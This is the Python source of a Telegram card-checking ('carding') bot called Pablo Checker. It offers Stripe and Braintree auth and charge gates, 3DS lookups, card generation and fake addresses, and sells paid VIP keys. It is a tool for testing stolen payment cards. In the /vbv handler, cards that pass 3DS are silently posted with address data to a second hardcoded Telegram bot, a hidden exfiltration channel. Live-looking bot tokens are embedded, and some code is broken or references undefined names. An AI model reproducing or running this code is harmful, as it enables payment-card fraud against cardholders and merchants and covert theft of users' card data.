import pycountry
import telebot
from telebot import types
import time
from telebot.types import LabeledPrice
import threading
import json
import random
import datetime
from datetime import timedelta
from datetime import datetime
import string
from faker import Faker
import requests
from bs4 import BeautifulSoup
from reg import *
from vbv import *
from chk import *
from bb import *
from pp import *
from cc import *
from sp import *
from stc import *
from st import *
from b3 import *
from bt import *
import os
from genfun import gen_card

admin = 5575401798  
token = "7344773060:AAFu1H45a5S-SqbDyXKZdgp5-GwAtjrsN_4"
cache_file = "bin_cache.json"
command_usage = {}
stopuser = {}
bot = telebot.TeleBot(token, parse_mode="HTML")
current_year = datetime.now().year % 100
current_month = datetime.now().month
bot_working=True

time_sleeps = {
    'Braintree Auth': 10,
    'Braintree Charge': 10,
    'Stripe Auth': 10,
    'Stripe Charge': 10,
    '3D Lookup': 10,
    'Paypal': 10
}

# قائمة لتخزين حالة البوابات
gate_status = {
    'Braintree Auth': 'open',
    'Braintree Charge': 'open',
    'Stripe Auth': 'open',
    'Stripe Charge': 'open',
    '3D Lookup': 'open',
    'Paypal': 'open'
}




def process_bin_info(bin_value):
    try:
        meet_headers = {
            'Referer': 'https://bincheck.io/ar',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get(f'https://bincheck.io/ar/details/{bin_value}', headers=meet_headers)
        soup = BeautifulSoup(response.text, 'html.parser')

        table1 = soup.find('table', class_='w-full table-auto')
        rows1 = table1.find_all('tr')

        table2 = soup.find_all('table', class_='w-full table-auto')[1]
        rows2 = table2.find_all('tr')

        info = {}
        
        for row in rows1:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                cell2_text = cells[1].text.strip()
                if cell1_text == 'العلامة التجارية للبطاقة':
                    info['brand'] = cell2_text
                elif cell1_text == 'نوع البطاقة':
                    info['card_type'] = cell2_text
                elif cell1_text == 'تصنيف البطاقة':
                    info['card_level'] = cell2_text
                elif cell1_text == 'اسم المصدر / البنك':
                    info['bank'] = cell2_text

        for row in rows2:
            cells = row.find_all('td')
            if len(cells) == 2:
                cell1_text = cells[0].text.strip()
                if cell1_text == 'اسم الدولة ISO':
                    info['country_name'] = cells[1].text.strip()
                    # استخدام pycountry للحصول على العلم
                    country = pycountry.countries.get(name=info['country_name'])
                    info['flag'] = country.flag if country else ""
                elif cell1_text == 'عملة البلد ISO':
                    info['currency'] = cells[1].text.strip()

        return info

    except Exception as e:
        return {"error": str(e)}
def save_cache():
    with open(cache_file, "w") as file:
        json.dump(bin_cache, file)

if os.path.exists(cache_file):
    with open(cache_file, "r") as file:
        bin_cache = json.load(file)
else:
    bin_cache = {}
    
def get_bin_info(bin):
    if bin in bin_cache:
        return bin_cache[bin]
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin[:6]}")
        response.raise_for_status()
        data = response.json()
        info = {
            "scheme": data.get("scheme", "").upper(),
            "type": data.get("type", "").upper(),
            "brand": data.get("brand", "").upper(),
            "bank": data.get("bank", {}).get("name", "").upper(),
            "country": data.get("country", {}).get("name", "").upper(),
            "emoji": data.get("country", {}).get("emoji", "")
        }
        bin_cache[bin] = info
        save_cache()
        return info
    except Exception as e:
        print(f"Error fetching BIN info: {e}")
        return {
            "scheme": "",
            "type": "",
            "brand": "",
            "bank": "",
            "country": "",
            "emoji": ""
        }


@bot.message_handler(commands=["start"])
def start(message):
    
    
    sent_message = bot.send_message(chat_id=message.chat.id, text='''💥
    ''')
    
    time.sleep(1.5)
    
    mes = types.InlineKeyboardMarkup(row_width=2)
    mero = types.InlineKeyboardButton("Rigister", callback_data='Rigister')
    cm1 = types.InlineKeyboardButton("Cmds", callback_data='Cmds')
    buy = types.InlineKeyboardButton("Buy Vip", callback_data='Buy')
    mes.add(mero, cm1,buy)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id, message_id=sent_message.message_id, text=f'''Hi {name} Welcome To Pablo Checker.⌛''', reply_markup=mes)
    
@bot.callback_query_handler(func=lambda call: call.data == 'start')
def start(call):
    mes = types.InlineKeyboardMarkup(row_width=2)
    mero = types.InlineKeyboardButton("Rigister", callback_data='Rigister')
    cm1 = types.InlineKeyboardButton("Cmds", callback_data='Cmds')
    buy = types.InlineKeyboardButton("Buy Vip", callback_data='Buy')
    mes.add(mero, cm1,buy)
    name = call.from_user.first_name
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''Hi {name} Welcome To Pablo Checker.⌛''', reply_markup=mes)
    

@bot.message_handler(commands=['info'])
def info(message):
    user_id = str(message.chat.id)

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا
    if user_id in data:
        user_data = data[user_id]
        response = f"البيانات الخاصة بك:\nالخطة: {user_data['plan']}\nالوقت: {user_data['timer']}"
    else:
        response = "لم يتم العثور على بياناتك. يرجى التسجيل أولاً باستخدام الأمر /register."

    bot.reply_to(message, response)

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)



@bot.callback_query_handler(func=lambda call: call.data == 'Rigister')
def register(call):
    user_id = str(call.message.chat.id)  # تحويل معرف المستخدم إلى نص لتجنب المشاكل مع JSON
    plan = "𝗙𝗥𝗘𝗘"
    timer = "none"

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا من قبل
    if user_id in data:
        bot.reply_to(call.message, "أنت مسجل بالفعل. استخدم /info")
    else:
        # تحديث البيانات
        data[user_id] = {
            "plan": plan,
            "timer": timer
        }

        # كتابة البيانات إلى الملف
        write_data(data)
        bot.reply_to(call.message, "تم تسجيل البيانات بنجاح!")

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.register') or message.text.lower().startswith('/register'))
def register(message):
    user_id = str(message.chat.id)  # تحويل معرف المستخدم إلى نص لتجنب المشاكل مع JSON
    plan = "𝗙𝗥𝗘𝗘"
    timer = "none"

    # قراءة البيانات الحالية من الملف
    data = read_data()

    # التحقق مما إذا كان المستخدم مسجلًا من قبل
    if user_id in data:
        bot.reply_to(message, "أنت مسجل بالفعل. استخدم /info")
    else:
        # تحديث البيانات
        data[user_id] = {
            "plan": plan,
            "timer": timer
        }

        # كتابة البيانات إلى الملف
        write_data(data)
        bot.reply_to(message, "تم تسجيل البيانات بنجاح!")

def read_data():
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def write_data(data):
    with open('data.json', 'w') as file:
        json.dump(data, file, ensure_ascii=False, indent=4)


@bot.callback_query_handler(func=lambda call: call.data == 'Cmds')
def cmds(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    gate_btn = types.InlineKeyboardButton(" Auth Gates ", callback_data="Auth")
    lock_btn = types.InlineKeyboardButton(" Charge Gates ", callback_data="Charge")
    unlock_btn = types.InlineKeyboardButton("  Other  ", callback_data="other")
    markup = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("  Back  ", callback_data="start")
    markup.add(gate_btn, lock_btn, unlock_btn, back)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="❓ How can I assist you today? ", reply_markup=markup)
    
    
@bot.callback_query_handler(func=lambda call: call.data == 'other')
def Auth(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    lock_btn =  types.InlineKeyboardButton(" Other ", callback_data="l")
    unlock_btn = types.InlineKeyboardButton(" ⚠️ Back ⚠️ ", callback_data="Cmds")
    markup.add( lock_btn, unlock_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="""This Is My Other Cmds.
    
💳 BIN Info:
Retrieve information for a specific Bank Identification Number.
Command: /bin {6-digit bin}
Example: /bin 412236

🔐 CC Generator:
Generate a credit card number for testing purposes.
Command: /gen CARD_NUMBER | EXP_DATE | CVV
Example: /gen 412236xxxx|xx|2025|xxx

🛡 3DS Lookup:
Checks if the card requires OTP or 3D Authentication.
Command: /vbv
Format: /vbv XXXXXXXXXXXXXXXX | EXP_DATE | CVV

🛡 Mass 3DS Lookup (Up to 5 Cards):
Command: /mvbv 
Format:
/mvbv XXXXXXXXXXXXXXXX | EXP_DATE | CVV
XXXXXXXXXXXXXXXX | EXP_DATE | CVV
XXXXXXXXXXXXXXXX | EXP_DATE | CVV
... and so on ...
Note: Ensure each card is on a separate line.

📍 Address Generator:
Generate a random address based on the country code provided.
Command: /fake {COUNTRY CODE}
Example 1: /fake us
Example 2: /fake uk

Register To The Bot
/register 
You must do this to use commands

Info 
/info 
To know Your Subsripetion info



Bot Devoleper : Your Uncle Pablo [@SUKHX_7171] 
     """, reply_markup=markup)
    
    
@bot.callback_query_handler(func=lambda call: call.data == 'Auth')
def Auth(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    lock_btn =  types.InlineKeyboardButton(" Auth Gates ", callback_data="l")
    unlock_btn = types.InlineKeyboardButton(" ⚠️ Back ⚠️ ", callback_data="Cmds")
    markup.add( lock_btn, unlock_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="""This Is My Auth Cmds.
Stripe :
/st
/cc
Braintree :
/chk
/bb
/b3 

Bot Devoleper : Your Uncle Pablo [@vickyisonlive1] 
     """, reply_markup=markup)
    
    
@bot.callback_query_handler(func=lambda call: call.data == 'Charge')
def charge(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    gate_btn = types.InlineKeyboardButton(" Charge Gates ", callback_data="Charge")
    unlock_btn = types.InlineKeyboardButton(" ⚠️ Back ⚠️ ", callback_data="Cmds")
    markup.add(gate_btn, unlock_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="""This Is My Charge Cmds.
Stripe :
/stc
/sp
Braintree :
/bt 

Bot Devoleper : Your Uncle Pablo [@vickyisonlive1]  """, reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data == 'Buy')
def gates(call):
    markup = types.InlineKeyboardMarkup(row_width=1)
    gate_btn = types.InlineKeyboardButton("1 Hour", callback_data="buy_1hour")
    lock_btn = types.InlineKeyboardButton("1 Day", callback_data="buy_1day")
    unlock_btn = types.InlineKeyboardButton("1 Weak", callback_data="buy_1week")
    markup.add(gate_btn, lock_btn, unlock_btn)
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="اختر مده الاشتراك", reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data == 'buy_1hour')
def process_payment(call):
    SERVICE_COST = '40'
    prices = [
        LabeledPrice(label="اشتراك لمده ساعه", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده ساعه",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك ساعه في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=1
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='Pablo-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『SUKHX_7171』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@vickyisonlive1 🕸
</b>'''
    			bot.send_message(message.chat.id,msg,parse_mode="HTML")


@bot.callback_query_handler(func=lambda call: call.data == 'buy_1day')
def process_payment(call):
    SERVICE_COST = '150'
    prices = [
        LabeledPrice(label="اشتراك لمده يوم", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده يوم",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك يوم في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=24
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='Pablo-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『SUKHX_7171』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@vickyisonlive1 🕸
</b>'''
    			bot.send_message(message,msg,parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == 'buy_1week')
def process_payment(call):
    SERVICE_COST = '830'
    prices = [
        LabeledPrice(label="اشتراك لمده اسبوع", amount=SERVICE_COST * 1)
    ]  

    bot.send_invoice(
        chat_id=call.message.chat.id,
        title="اشتراك لمده اسبوع",
        description=f"ادفع {SERVICE_COST} نجمة للاشتراك اسبوع في البوت",
        provider_token="",
        currency="XTR",
        prices=prices,
        start_parameter="pay_with_stars",
        invoice_payload="Star-Payment-Payload",
    )


@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    bot.send_message(message.chat.id, "تم الدفع بنجاح! شكرًا لاستخدامك الخدمة.")
    h=168
    with open('data.json', 'r') as json_file:
    	existing_data = json.load(json_file)
    	characters = string.ascii_uppercase + string.digits
    	pas ='Pablo-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
    	current_time = datetime.now()
    	ig = current_time + timedelta(hours=h)
    	plan='vip'
    	parts = str(ig).split(':')
    	ig = ':'.join(parts[:2])
    	with open('data.json', 'r') as json_file:
    		existing_data = json.load(json_file)
    		new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
    		existing_data.update(new_data)
    		with open('data.json', 'w') as json_file:
    			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
    			msg=f'''<b>
Payment Done Sucssesfully

This The Code 
You Can Redeem It Or Send It gift for your frined 

├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『SUKHX_7171』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem [𝗞𝗘𝗬]
BOT :@vickyisonlive1 🕸
</b>'''
    			bot.send_message(message,msg,parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
    def my_function():
        global stop
        try:
            re = message.text.split(' ')[1]
            with open('data.json', 'r') as file:
                json_data = json.load(file)
            
            if re not in json_data:
                raise KeyError(f'Code {re} not found in JSON data.')
            
            timer = json_data[re]['time']
            typ = json_data[re]['plan']
            json_data[str(message.from_user.id)] = {'timer': timer, 'plan': typ}
            
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            
            with open('data.json', 'r') as json_file:
                data = json.load(json_file)
            
            del data[re]
            
            with open('data.json', 'w') as json_file:
                json.dump(data, json_file, ensure_ascii=False, indent=4)
            
            msg = f'''<b>𓆩𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆𓆪! 👑🌪:  𝐃ev : 『@vickyisonlive1』  »»{timer}
{typ}</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except KeyError as e:
            print('ERROR : ', e)
            bot.reply_to(message, '<b>Incorrect code or it has already been redeemed </b>', parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, '<b>An error occurred while processing your request.</b>', parse_mode="HTML")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["code"])
def code(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			returnى٦
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='Pablo-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='vip'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>
🕸𓆩𝐊𝐞𝐲 𝐂𝐫𝐞𝐚𝐭𝐞𝐝𓆪
🕷🕸🕷🕸🕷🕸🕷🕸🕷🕸                     
├𝗦𝗧𝗔𝗧𝗨𝗦»»»{plan}
├𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻»»»{ig}
├『SUKHX_7171』
├𝑲𝒆𝒚  <code>{pas}</code>	
├𝙐𝙨𝙖𝙜𝙚 /redeem 🕷[𝗞𝗘𝗬]
BOT :@vickyisonlive1 🕸
</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
			
			

		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()



@bot.message_handler(commands=['fake'])
def generate_fake_address(message):
    with open('data.json') as f:
    	data = json.load(f)
    	user_id = str(message.from_user.id)
    	if user_id not in data:
	       
	       bot.reply_to(message, "You need to be registered to use this command.")
	       return
    def my_function():
        try:
            
            country_code = message.text.split(' ')[1].lower()
            
            
            if country_code not in faker_instances:
                bot.reply_to(message, '<b>Invalid country code. Please try again.</b>', parse_mode="HTML")
                return
            
            
            fake = faker_instances[country_code]
            full_name = fake.name()
            street_address = fake.street_address()
            city = fake.city()
            state = fake.state() if hasattr(fake, 'state') else "N/A"
            postal_code = fake.zipcode()
            phone_number = fake.phone_number()
            email = fake.email()
            
           
            msg = f'''📍 {country_code.upper()} Address Generator

𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {full_name}
𝗦𝘁𝗿𝗲𝗲𝘁 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {street_address}
𝗖𝗶𝘁𝘆/𝗧𝗼𝘄𝗻/𝗩𝗶𝗹𝗹𝗮𝗴𝗲: {city}
𝗦𝘁𝗮𝘁𝗲/𝗣𝗿𝗼𝘃𝗶𝗻𝗰𝗲/𝗥𝗲𝗴𝗶𝗼𝗻: {state}
𝗣𝗼𝘀𝘁𝗮𝗹 𝗖𝗼𝗱𝗲: {postal_code}
𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: {phone_number}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_code.upper()}
𝗧𝗲𝗺𝗽𝗼𝗿𝗮𝗿𝘆 𝗘𝗺𝗮𝗶𝗹: {email}'''
            bot.reply_to(message, msg, parse_mode="HTML")
        
        except IndexError:
            bot.reply_to(message, '<b>Please provide a country code. Example: /fake us</b>', parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, '<b>An error occurred while processing your request.</b>', parse_mode="HTML")
   
    my_thread = threading.Thread(target=my_function)
    my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	 	data = json.load(f)
	 user_id = str(message.from_user.id)
	 if user_id not in data:
	       
	       bot.reply_to(message, "You need to be registered to use this command.")
	       return
	 gate='3D Lookup'
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 15:
	   bot.reply_to(message, f"<b>Try again after {15-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:غلطططط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(vbv(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
	
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@vickyisonlive1』</b>'''
	 msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
	
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@vickyisonlive1』</b>'''
	 if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		 tok = '6875574369:AAHGlGQpQVZv5laZVFoL_LV_1q07MNOdO20'
		 acc = '2213171011'
		 mg = f"""<b> 
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
✪ 𝙼𝚈
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @vickyisonlive1
</b>"""
		 tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		 tlg_params = {"parse_mode": "HTML"}
		 tok = '6875574369:AAHGlGQpQVZv5laZVFoL_LV_1q07MNOdO20'
		 acb =  '2213171011'
		 mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		 tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		 tly_params = {"parse_mode": "HTML"}
		 a = requests.post(tly, params=tly_params)
		 i = requests.post(tlg, params=tlg_params)
		 bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
		 bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')

@bot.message_handler(func=lambda message: message.text.lower().startswith('.mvbv') or message.text.lower().startswith('/mvbv'))
def respond_to_mvbv(message):
    with open('data.json') as f:
    	data = json.load(f)
    	user_id = str(message.from_user.id)
    	if user_id not in data:
	       
	       bot.reply_to(message, "You need to be registered to use this command.")
	       return
    gate = '3D Lookup'
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {
            'last_time': datetime.now()
        }
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 30:
            bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
            return

    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id

    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text

    # تقسيم البطاقات باستخدام المسافة كفاصل
    cc_list = cc.split()  # هنا يتم تقسيم النص بناءً على المسافة
    if len(cc_list) > 5:
        cc_list = cc_list[:5]  # يقتصر على 5 بطاقات كحد أقصى

    results = []
    for card in cc_list:
        card = card.strip()
        card = str(reg(card))
        if card == 'None':
            results.append(f"<b>🚫 Oops! Card format is incorrect: {card}</b>")
            continue

        start_time = time.time()
        try:
            command_usage[idt]['last_time'] = datetime.now()
            last = str(vbv(card))
        except Exception as e:
            last = 'Error'

        try:
            data = requests.get(f'https://bins.antipublic.cc/bins/{card[:6]}').json()
        except:
            data = {}

        brand = data.get('brand', 'Unknown')
        card_type = data.get('type', 'Unknown')
        country = data.get('country_name', 'Unknown')
        country_flag = data.get('country_flag', 'Unknown')
        bank = data.get('bank', 'Unknown')

        end_time = time.time()
        execution_time = end_time - start_time

